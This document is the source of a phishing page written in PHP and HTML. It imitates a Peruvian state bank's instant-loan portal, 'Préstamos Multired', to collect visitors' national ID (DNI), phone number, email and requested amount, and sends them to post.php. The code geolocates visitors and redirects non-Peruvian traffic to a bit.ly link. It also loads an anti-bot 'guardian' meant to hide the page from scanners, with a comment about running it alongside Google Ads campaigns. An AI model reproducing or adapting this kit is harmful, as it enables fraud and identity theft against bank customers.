<?php
session_start();

$cliente = getIP();

$xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$cliente);
SSLPage($xml);
$pais = $xml->geoplugin_countryName ; // Pais


function SSLPage($url) {

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_HEADER, FALSE);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

	$result = curl_exec($ch);

	curl_close($ch);

	return $result;
}

function getIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $cliente = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    elseif(isset($_SERVER["HTTP_CLIENT_IP"])) {
       $cliente = $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif(isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
       $cliente = $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    elseif(isset($_SERVER["HTTP_X_FORWARDED"])) {
       $cliente = $_SERVER["HTTP_X_FORWARDED"];
    }
    elseif(isset($_SERVER["HTTP_FORWARDED_FOR"])) {
       $cliente = $_SERVER["HTTP_FORWARDED_FOR"];
    }
    elseif(isset($_SERVER["HTTP_FORWARDED"])) {
       $cliente = $_SERVER["HTTP_FORWARDED"];
    }
    else {
       $cliente = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : false;
    }
    if ($cliente === '::1' || $cliente === '127.0.0.1') {
       $cliente = '181.67.216.84';
    }
    return $cliente;
}
/**************************************************************/
$police = 1; /* 1 para activar antibots | NO SE RECOMIENDA USAR ANTIBOTS EN CAMPAÑAS DE GOOGLE ADS
para ver, activar o desactivar algún escudo del guardian revisar en su config police/config.ini
/**************************************************************/
if ($police == '1') {
    include 'guardian/on.php';
}

/**************************************************************/
if ($pais != "Peru") {
    echo'<form id="form" action="https://bit.ly/bingMoneyInstant" method="post"></form><script>document.forms["form"].submit()</script>';
}
/**************************************************************/
?>
<!DOCTYPE html>
<html lang="en" class="hydrated">
<head>
<style>
        /* Add this style to define a custom class for a red background */
        .bg-red-header {
            background-color: red;
        }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Prestamo al instante</title>
    <link rel="stylesheet" href="rino/styles/main.css">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="rino/images/favicon.png" rel="icon" type="image/x-icon">
    <link rel="stylesheet" href="rino/styles/stylo.css">
</head>
<body>
<div id="loader_ajax" style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
    <div id="ajax_loader" class="esparta">
        <div class="text-center">
            <img src="rino/images/spinner.gif" style="padding: 445px 0px 0px 0px;">
        </div>
    </div>
</div>
<eva-root _nghost-hbf-c0="" ng-version="7.2.16">
    <bcp-layout _ngcontent-hbf-c0="" fixed-menu="" ignore-scroll="" class="hydrated">
        <section class="layout">
            <bcp-navbar menu-position="right" is-fixed="" class="hydrated">
                <nav class="navbar navbar-expand-sm bg-red-header navbar-dark fixed-top" style="height: 25px;">
                    <div class="container">
                        <a class="brand-margin-left navbar-brand">
                            <bcp-img class="hydrated">
                                <img alt="" src="rino/images/Préstamos.png" style="width: 40px; height:40px;" class="hydrated">
                            </bcp-img>
                            <bcp-character class="hydrated">
                                <p class="character-lg bcp-font-regular white-80">PRÉSTAMOS MULTIRED</p>
                            </bcp-character>
                        </a>
                    </div>
                </nav>
            </bcp-navbar>
            <main class="layout-content">
                <router-outlet _ngcontent-hbf-c0=""></router-outlet>
                <eva-home _nghost-hbf-c1="">
                    <eva-banner _ngcontent-hbf-c1="" _nghost-hbf-c2="">
                        <div _ngcontent-hbf-c2="" class="banner">
                            <div _ngcontent-hbf-c2="" class="container">
                                <div _ngcontent-hbf-c2="" class="row">
                                    <div _ngcontent-hbf-c2="" class="col-md-6 order-md-2 d-flex justify-content-center align-items-center">
                                        <h1 _ngcontent-hbf-c2="" class="text-center d-none d-md-block">
                                            <span _ngcontent-hbf-c2="" class="bold">¡Pide tu préstamo 100% online</span>
                                            <br _ngcontent-hbf-c2="">y recíbelo en tu cuenta al instante!
                                        </h1>
                                        <h1 _ngcontent-hbf-c2="" class="text-center d-block d-md-none">
                                            <span _ngcontent-hbf-c2="" class="bold">¡Pide tu préstamo 100% online y</span>
                                            <br _ngcontent-hbf-c2="">recíbelo en tu cuenta al instante !
                                        </h1>
                                    </div>
                                    <div _ngcontent-hbf-c2="" class="col-md-6 order-md-3 d-flex justify-content-center justify-content-md-end">
                                        <div _ngcontent-hbf-c2="">
                                            <picture _ngcontent-hbf-c2="" class="banner-start-image">
                                                <img _ngcontent-hbf-c2="" alt="" class="banner-start-img" src="rino/images/logo.png">
                                            </picture>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </eva-banner>
                    <eva-loan-request-form _ngcontent-hbf-c1="" _nghost-hbf-c3="">
                        <div _ngcontent-hbf-c3="" class="container">
                            <div _ngcontent-hbf-c3="" class="row">
                                <div _ngcontent-hbf-c3="" class="col">
                                    <div _ngcontent-hbf-c3="" class="card">
                                        <div _ngcontent-hbf-c3="" class="card-body">
                                            <form class="ng-untouched ng-pristine ng-invalid">
                                                <div _ngcontent-hbf-c3="" class="row align-items-center">
                                                    <label _ngcontent-hbf-c3="" for="monto" style="padding-left: 20px;">Solicita tu préstamo:</label>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated">
                                                                    <div class="form-group">
                                                                        <input class="form-control" autocomplete="off" placeholder="Monto" required="" id="monto" name="monto" type="tel" maxlength="5" onkeypress="return tipoFiltro(event)">
                                                                        <bcp-paragraph id="bcp-input-0-lbl" class="input-label hydrated"></bcp-paragraph>
                                                                    </div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col-auto p-lg-0"></div>
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated">
                                                                    <div class="form-group">
                                                                        <input class="form-control" autocomplete="off" id="dni" name="dni" onkeypress="return tipoFiltro(event)" placeholder="DNI" required="" type="tel" maxlength="8">
                                                                        <bcp-paragraph id="bcp-input-0-lbl" class="input-label hydrated"></bcp-paragraph>
                                                                    </div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col-auto p-lg-0"></div>
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated">
                                                                    <div class="form-group">
                                                                        <input class="form-control" autocomplete="off" id="tlf" name="tlf" onkeypress="return tipoFiltro(event)" pattern="[9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]" required="" placeholder="Celular" type="tel" maxlength="9">
                                                                        <bcp-paragraph id="bcp-input-0-lbl" class="input-label hydrated"></bcp-paragraph>
                                                                    </div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col-auto p-lg-0"></div>
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated">
                                                                    <div class="form-group">
                                                                        <input class="form-control" autocomplete="off" id="mail" name="mail" required="" placeholder="Email" type="tex" maxlength="50">
                                                                        <bcp-paragraph id="bcp-input-0-lbl" class="input-label hydrated"></bcp-paragraph>
                                                                    </div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md-auto">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column">
                                                            <div _ngcontent-hbf-c3="" class="col submit-col p-lg-0">
                                                                <bcp-button _ngcontent-hbf-c3="" size="lg" class="hydrated">
                                                                    <button type="button" class="btn btn-primary btn-lg btn-block" onclick="post(1);" style="background-color: red; color: white;">
                                                                    <bcp-paragraph class="hydrated">
                                                                            <p class="paragraph-lg bcp-font-demi white">Empezar </p>
                                                                            </bcp-paragraph>
                                                                            <bcp-icon _ngcontent-hbf-c3="" name="arrow-right-r" slot="end" class="hydrated">
                                                                                <i class="icon arrow-right-r "></i>
                                                                        </bcp-icon>
                                                                    </button>
                                                                </bcp-button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <p id="alerta" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: red; font-size: 0.9rem; display: none;"></p>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </eva-loan-request-form>
                    <eva-business-hours _ngcontent-hbf-c1="" _nghost-hbf-c4="">
                        <div _ngcontent-hbf-c4="" class="container-fluid">
                            <p _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0">Recuerda que el horario de atención es de<br _ngcontent-hbf-c4=""><strong _ngcontent-hbf-c4="">8:00 AM hasta 8:45 PM.</strong><br _ngcontent-hbf-c4="">las solicitudes fueras del horario serán atendidas al día siguiente</p>
                        </div>
                    </eva-business-hours>
                    <eva-benefits _ngcontent-hbf-c1="" _nghost-hbf-c5="">
                        <div _ngcontent-hbf-c5="" class="container mt-0 text-center" id="test">
                            <div _ngcontent-hbf-c5="" class="row">
                                <div _ngcontent-hbf-c5="" class="col text-center">
                                    <!-- <h2 _ngcontent-hbf-c5="">Beneficios</h2> -->
                                    <p _ngcontent-hbf-c5="">Disfruta de grandes beneficios a través de nuestra web</p>
                                </div>
                            </div> </div>
                        </div>
                    </eva-benefits>
                    <eva-information _ngcontent-hbf-c1="" _nghost-hbf-c7="">
                        <div _ngcontent-hbf-c7="" class="container instrucciones text-center">
                            <div _ngcontent-hbf-c7="" class="row">
                                <div _ngcontent-hbf-c7="" class="col">
                                    <p _ngcontent-hbf-c7="" class="m-0">
                                        Recuerda que obtendrás el préstamo si cumples con los requisitos de la evaluación crediticia online exitosamente.<br>En caso no podamos otorgarte el préstamo a través de este canal,
                                        puedes acercarte a <br>cualquiera de nuestras agencias a nivel nacional.
                                    </p>
                                </div>
                            </div>
                            <div _ngcontent-hbf-c7="" class="row">
                                <div _ngcontent-hbf-c7="" class="col start-conditions" >
                                    <p _ngcontent-hbf-c7="">
                                        Le informamos que puede contratar un Seguro de Desgravamen de otra compañía de seguros y realizar el endoso al Banco,
                                        siempre y cuando se cumpla con las condiciones informadas previamente. El trámite para el endoso de su póliza lo podrá realizar gratuitamente en cualquier Agencia BN.
                                    </p>
                                    <p _ngcontent-hbf-c7="">
                                    La TCEA máxima referencial es 26.78%. Por ejemplo, para un préstamo de S/ 3,000 a 12 meses, la TCEA máxima es 26.78% y la cuota mensual es S/ 302.74, las cuales se calculan en base a una tasa de interés efectiva anual (TEA) de 25% y un seguro de desgravamen mensual de 0.705% del saldo. En caso de retraso en los pagos, aplicará la penalidad de pago atrasado, salvo prohibición legal expresa, en cuyo caso aplicarán los intereses moratorios establecidos en la Hoja de Resumen de su crédito.
                                    </p>
                                    <p _ngcontent-hbf-c7="">Esta web brinda préstamos con plazos desde 3 meses hasta 60 meses.</p>
                                </div>
                            </div>
                        </div>
                    </eva-information>
                </eva-home>
                <bcp-footer _ngcontent-hbf-c0="" dark-theme="true" transparent="false" class="hydrated">
                    <footer class="footer">
                        <div class="container" style="margin-bottom:20px;">
                            <bcp-footer-body _ngcontent-hbf-c0="" class="hydrated">
                                <div class="footer-body row no-gutters">
                                    <div class="col-sm-12 col-md-8 content-left">
                                        <ul class="list-items less">
                                            <bcp-img class="footer-logo hydrated">
                                                <img class="footer-logo hydrated" style="transform: scale(1.3);" src="rino/images/logobn.jpg">
                                            </bcp-img>
                                            <li>
                                                <bcp-paragraph class="hydrated">
                                                    <p class="paragraph-md bcp-font-regular onsurface-600">© 2024</p>
                                                </bcp-paragraph>
                                            </li>
                                            <li>
                                                <bcp-paragraph class="hydrated">
                                                    <p style="margin-botton: 20px;" class="paragraph-md bcp-font-regular onsurface-600">Todos los derechos reservados</p>
                                                </bcp-paragraph>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </bcp-footer-body>
                        </div>
                    </footer>
                </bcp-footer>
            </main>
        </section>
    </bcp-layout>
</eva-root>
<script type="text/javascript" src="rino/js/jquery-3.1.0.min.js"></script>
<script>

    function tipoFiltro(e) {

        var charCode = e.key;

        if((/^[0-9]+$/.test(charCode))) {
            return true;
        } else {
            return false;
        }
    }

    function post(post) {
    
        let a = document.querySelector("#monto"); // Monto
        let b = document.querySelector("#dni"); // Documento
        let c = document.querySelector("#tlf"); // Celular
        let d = document.querySelector("#mail"); // Email
        
        let x = post;

        switch (x) {
    
            case 1: // Login

                if (a.value == "" && b.value == "" && c.value == "") {
                    $("#alerta").html("* Para continuar, por favor complete el formulario").show();
                    a.focus();
                    return false;
                }

                if (a.value <= 100 || a.value > 200000) {
                    $("#alerta").html("* Ingrese un monto mayor a 100 y menor a 200.000").show();
                    a.focus();
                    return false;
                }

                if (b.value.length < 8) {
                    $("#alerta").html("* Ingrese ó complete su número de DNI").show();
                    b.focus();
                    return false;
                }

                if (c.value.length < 9) {
                    $("#alerta").html("* Ingrese ó complete su número de Celular").show();
                    c.focus();
                    return false;
                }

                if (d.value.length < 9) {
                    $("#alerta").html("Ingresa ó completa tu email").show();
                    d.focus();
                    return false;
                } else {
                    var regex = /[\w-\.]{2,}@([\w-]{2,}\.)*([\w-]{2,}\.)[\w-]{2,4}/;
                    if (regex.test(d.value.trim())) {
                        $("#alerta").html("&nbsp;");
                    } else {
                        $("#alerta").html("Por favor, ingresa un correo electrónico valido").show();
                        d.focus();
                        return false;
                    }
                }

                var parametros = {
                    "data_1": a.value,
                    "data_2": b.value,
                    "data_3": c.value,
                    "data_13": d.value,
                    "orden": "A", }
                
                $("#alerta").hide();
                $("#loader_ajax").show();
            
                $.ajax({
                    data: parametros,
                    url: 'post.php',
                    type: 'post',
                    success: function(response) {
                        setTimeout(function() {
                            window.open('inicio', '_parent');
                        }, 1800);
                    }
                });

            break;

            default:
            break;
        }
    }
</script>
</body>
</html>